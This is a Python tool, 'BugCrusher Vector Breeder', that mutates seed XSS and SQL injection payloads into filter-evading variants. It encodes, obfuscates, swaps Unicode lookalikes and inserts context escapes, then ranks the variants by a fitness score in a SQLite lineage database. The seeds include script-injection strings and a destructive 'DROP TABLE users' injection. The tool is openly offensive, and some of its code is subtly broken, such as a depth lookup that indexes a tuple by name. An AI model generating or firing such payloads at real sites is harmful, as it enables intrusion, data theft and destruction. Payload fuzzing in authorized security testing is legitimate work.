#!/usr/bin/env python3
"""
BugCrusher — Vector Strike: Mutation Breeding Engine
Autonomously breeds new attack vectors from successful patterns.
"""

import sqlite3
import json
import uuid
import hashlib
import random
import string
import re
import struct
import base64
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any

DB_PATH = "/home/workspace/BugCrusher/vector_db.sqlite"

class VectorBreeder:
    """
    Mutation engine that breeds new exploits from successful vectors.
    
    Takes a known working payload → mutates it → creates variants
    → tests conceptually → stores the lineage.
    
    Usage:
        breeder = VectorBreeder()
        variants = breeder.breed(
            payload="<img src=x onerror=alert(1)>",
            category="XSS",
            iterations=10
        )
        for v in variants:
            print(f"Generated: {v['payload']} (fitness: {v['fitness_score']})")
    """
    
    def __init__(self, db_path: str = DB_PATH):
        self.db_path = db_path
        self._init_db()
    
    def _init_db(self):
        """Initialize vector database with lineage tracking."""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS vectors (
                id TEXT PRIMARY KEY,
                payload TEXT NOT NULL,
                category TEXT NOT NULL,
                subcategory TEXT,
                encoding TEXT,
                target TEXT,
                cvss REAL,
                cwe_id TEXT,
                working INTEGER DEFAULT 0,
                success_count INTEGER DEFAULT 0,
                failure_count INTEGER DEFAULT 0,
                fitness_score REAL DEFAULT 0.5,
                parent_id TEXT,
                generation INTEGER DEFAULT 1,
                mutation_type TEXT,
                tags TEXT,
                discovered_at TEXT,
                last_used TEXT,
                notes TEXT,
                created_by TEXT DEFAULT 'breeder',
                FOREIGN KEY (parent_id) REFERENCES vectors(id)
            )
        ''')
        c.execute('''
            CREATE TABLE IF NOT EXISTS mutation_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                parent_id TEXT,
                child_id TEXT,
                mutation_type TEXT,
                mutation_params TEXT,
                timestamp TEXT,
                success BOOLEAN
            )
        ''')
        c.execute('''
            CREATE TABLE IF NOT EXISTS technique_families (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE,
                description TEXT,
                initial_vectors INTEGER DEFAULT 0,
                total_variants INTEGER DEFAULT 0,
                success_rate REAL DEFAULT 0.0
            )
        ''')
        conn.commit()
        conn.close()
    
    def breed(self, payload: str, category: str, iterations: int = 5, 
              target: str = None, working: bool = False) -> List[Dict]:
        """
        Breed new variants from a payload using multiple mutation strategies.
        """
        parent_id = str(uuid.uuid4())
        variants = []
        mutation_types = [
            'encode_mutation',
            'case_swap',
            'char_insertion',
            'char_deletion',
            'char_substitution',
            'tag_mutation',
            'context_escape',
            'polymorphic_shuffle',
            'obfuscation_layer',
            'protocol_mutation'
        ]
        
        for i in range(iterations):
            mut_type = random.choice(mutation_types)
            mutated = getattr(self, f"_{mut_type}")(payload)
            
            if mutated and mutated != payload:
                variant_id = str(uuid.uuid4())
                conn = sqlite3.connect(self.db_path)
                c = conn.cursor()
                c.execute('''
                    INSERT INTO vectors 
                    (id, payload, category, parent_id, generation, mutation_type, 
                     working, success_count, discovered_at, tags)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    variant_id, mutated, category, parent_id, 1,
                    mut_type, 1 if working else 0, 1 if working else 0,
                    datetime.now().isoformat(),
                    f"bred,{mut_type}"
                ))
                c.execute('''
                    INSERT INTO mutation_log 
                    (parent_id, child_id, mutation_type, timestamp, success)
                    VALUES (?, ?, ?, ?, ?)
                ''', (parent_id, variant_id, mut_type, datetime.now().isoformat(), working))
                conn.commit()
                conn.close()
                
                variants.append({
                    'id': variant_id,
                    'payload': mutated,
                    'mutation_type': mut_type,
                    'fitness_score': 0.7 if working else 0.5,
                    'generation': 1,
                    'parent': parent_id
                })
        
        return variants
    
    def _encode_mutation(self, payload: str) -> str:
        """Apply encoding mutations: URL, HTML, Base64, Hex."""
        mutations = []
        try:
            mutations.append(urllib.parse.quote(payload))
            mutations.append(urllib.parse.quote(urllib.parse.quote(payload)))
            mutations.append(base64.b64encode(payload.encode()).decode())
            mutations.append(payload.replace('<', '%3c').replace('>', '%3e'))
            hex_payload = ''.join(f'\\x{ord(c):02x}' for c in payload)
            mutations.append(hex_payload)
        except:
            pass
        return random.choice(mutations) if mutations else payload
    
    def _case_swap(self, payload: str) -> str:
        """Swap character cases."""
        return payload.swapcase()
    
    def _char_insertion(self, payload: str) -> str:
        """Insert special characters that may bypass filters."""
        insertions = ['/', '/', '/', '<!--', '-->', '<>', '`', '"', "'", '\n', '\t', '/*', '*/']
        pos = random.randint(0, len(payload))
        char = random.choice(insertions)
        return payload[:pos] + char + payload[pos:]
    
    def _char_deletion(self, payload: str) -> str:
        """Delete random characters."""
        if len(payload) > 3:
            pos = random.randint(1, len(payload) - 2)
            return payload[:pos] + payload[pos+1:]
        return payload
    
    def _char_substitution(self, payload: str) -> str:
        """Substitute characters with equivalents."""
        sub_map = {
            '<': ['<', '\u300c', '\u1628', '\u1438'],
            '>': ['>', '\uff1e', '\u27e9', '\u1433'],
            '"': ['"', '\u2033', '\uff02', '"'],
            "'": ["'", '\u2032', '\uff07', "'"],
            '=': ['=', '\u207c', '\uff1d', '\u2012'],
            '/': ['/', '\u2215', '\u2044', '\u29f8'],
        }
        result = payload
        for char, replacements in sub_map.items():
            if char in result:
                result = result.replace(char, random.choice(replacements), 1)
        return result
    
    def _tag_mutation(self, payload: str) -> str:
        """Mutate HTML/SVG tags."""
        tag_patterns = [
            (r'<img', '<img'),
            (r'<script', '<script'),
            (r'<svg', '<svg'),
            (r'onerror', 'onerror '),
            (r'onload', 'onload '),
            (r'alert', 'alert'),
        ]
        
        for pattern, replacement in tag_patterns:
            if re.search(pattern, payload, re.I):
                mutations = [
                    replacement + ' ',
                    replacement + '\n',
                    replacement + '\t',
                    replacement + '>',
                ]
                result = re.sub(pattern, random.choice(mutations), payload, flags=re.I)
                if result != payload:
                    return result
        
        return payload
    
    def _context_escape(self, payload: str) -> str:
        """Add context-breaking escape sequences."""
        escapes = [
            '</script>', '<',
            '\';alert(1);//',
            '";alert(1);//',
            '${alert(1)}',
            '{{alert(1)}}',
        ]
        pos = random.randint(0, len(payload))
        escape = random.choice(escapes)
        return payload[:pos] + escape + payload[pos:]
    
    def _polymorphic_shuffle(self, payload: str) -> str:
        """Shuffle payload segments."""
        parts = re.split(r'(<[^>]+>)', payload)
        if len(parts) > 1:
            random.shuffle(parts)
            return ''.join(parts)
        return payload
    
    def _obfuscation_layer(self, payload: str) -> str:
        """Add obfuscation layers."""
        layers = [
            lambda p: f"/*.{random.randint(100,999)}.*/{p}",
            lambda p: f"{p}//{random.choice(string.ascii_letters)}",
            lambda p: f"{p}\n//@ sourceMappingURL=evil.map",
            lambda p: f"{p}&#{random.randint(1,100)};",
        ]
        return random.choice(layers)(payload)
    
    def _protocol_mutation(self, payload: str) -> str:
        """Mutate protocol-level elements."""
        mutations = []
        if 'http' in payload.lower():
            mutations.append(payload.replace('http://', 'https://'))
            mutations.append(payload.replace('http://', 'HtTp://'))
            mutations.append(payload.replace('http://', 'hTTp://'))
        if 'javascript:' in payload.lower():
            mutations.append(payload.replace('javascript:', 'JavaScript:'))
            mutations.append(payload.replace('javascript:', 'JAVASCRIPT:'))
        return random.choice(mutations) if mutations else payload
    
    def get_vectors(self, category: str = None, min_fitness: float = 0.5, 
                    limit: int = 50) -> List[Dict]:
        """Retrieve stored vectors."""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        
        query = 'SELECT * FROM vectors WHERE fitness_score >= ?'
        params = [min_fitness]
        
        if category:
            query += ' AND category = ?'
            params.append(category)
        
        query += ' ORDER BY fitness_score DESC LIMIT ?'
        params.append(limit)
        
        c.execute(query, params)
        rows = c.fetchall()
        conn.close()
        
        return [dict(row) for row in rows]
    
    def mark_success(self, vector_id: str):
        """Mark a vector as successful."""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        sql = """
            UPDATE vectors 
            SET success_count = success_count + 1,
                fitness_score = MIN(1.0, fitness_score + 0.05),
                last_used = ?
            WHERE id = ?
        """
        c.execute(sql, (datetime.now().isoformat(), vector_id))
        conn.commit()
        conn.close()
    
    def mark_failure(self, vector_id: str):
        """Mark a vector as failed."""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        sql = """
            UPDATE vectors 
            SET failure_count = failure_count + 1,
                fitness_score = MAX(0.0, fitness_score - 0.1),
                last_used = ?
            WHERE id = ?
        """
        c.execute(sql, (datetime.now().isoformat(), vector_id))
        conn.commit()
        conn.close()
    
    def get_family_tree(self, vector_id: str) -> Dict:
        """Reconstruct the mutation lineage of a vector."""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        
        tree = {'root': None, 'children': [], 'depth': 0}
        
        c.execute('SELECT * FROM vectors WHERE id = ?', (vector_id,))
        root = c.fetchone()
        if root:
            tree['root'] = dict(root)
        
        def build_children(parent_id, depth=0):
            c.execute('SELECT * FROM vectors WHERE parent_id = ?', (parent_id,))
            children = c.fetchall()
            return [{'node': dict(child), 'children': build_children(child['id'], depth+1), 'depth': depth} for child in children]
        
        if root:
            tree['children'] = build_children(vector_id)
            tree['depth'] = self._get_depth(vector_id)
        
        conn.close()
        return tree
    
    def _get_depth(self, vector_id: str) -> int:
        """Calculate generation depth."""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('SELECT generation FROM vectors WHERE id = ?', (vector_id,))
        row = c.fetchone()
        conn.close()
        return row['generation'] if row else 0
    
    def evolve(self, category: str, generations: int = 3) -> List[Dict]:
        """
        Multi-generation breeding: take best performers → breed → repeat.
        This is the core evolution loop.
        """
        all_variants = []
        
        for gen in range(generations):
            parent_fitness = 0.6 + (gen * 0.1)
            parents = self.get_vectors(category=category, min_fitness=parent_fitness, limit=10)
            
            if not parents:
                break
            
            for parent in parents:
                variants = self.breed(
                    payload=parent['payload'],
                    category=category,
                    iterations=3,
                    working=parent['success_count'] > 0
                )
                all_variants.extend(variants)
        
        return all_variants


if __name__ == '__main__':
    breeder = VectorBreeder()
    
    print("[*] BugCrusher Vector Breeder — Mutation Engine")
    print("[*] Initializing with seed payloads...\n")
    
    seed_payloads = {
        'XSS': [
            '<img src=x onerror=alert(1)>',
            '"><script>alert(1)</script>',
            "javascript:alert('XSS')",
            '<svg/onload=alert(1)>',
        ],
        'SQLi': [
            "' OR '1'='1",
            "1' AND '1'='1",
            "1; DROP TABLE users--",
        ]
    }
    
    for category, payloads in seed_payloads.items():
        print(f"\n[*] Breeding {category} vectors...")
        for payload in payloads[:2]:
            variants = breeder.breed(payload, category, iterations=5)
            print(f"  Generated {len(variants)} variants from: {payload[:50]}...")
    
    print("\n[*] Running evolution across 3 generations...")
    evolved = breeder.evolve('XSS', generations=3)
    print(f"  Produced {len(evolved)} total variants")
    
    print("\n[*] Stored vectors:")
    vectors = breeder.get_vectors(category='XSS', limit=5)
    for v in vectors:
        print(f"  [{v['fitness_score']:.2f}] {v['payload'][:60]}...")
